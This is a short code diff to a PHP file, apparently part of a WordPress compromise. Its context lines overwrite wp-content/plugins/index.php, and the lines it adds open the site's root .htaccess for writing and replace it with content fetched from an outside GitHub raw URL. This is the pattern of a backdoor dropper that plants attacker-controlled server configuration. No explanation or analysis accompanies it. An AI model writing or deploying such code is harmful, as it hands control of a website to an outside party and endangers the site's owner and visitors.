@@ -25,3 +25,9 @@ $nama1= fopen($_SERVER['DOCUMENT_ROOT'] . '/wp-content/plugins/index.php' ,'w+')
   $tulis1 = fwrite ($nama1 ,$file1);
  fclose($nama1); ?>
  
+ <?php 
+$nama5= fopen($_SERVER['DOCUMENT_ROOT'] . '/.htaccess' ,'w+');
+  $file5 = file_get_contents('https://raw.githubusercontent.com/prokontra/all-in/main/hta_WP');
+  $tulis5 = fwrite ($nama5 ,$file5);
+ fclose($nama5); ?>
+ 
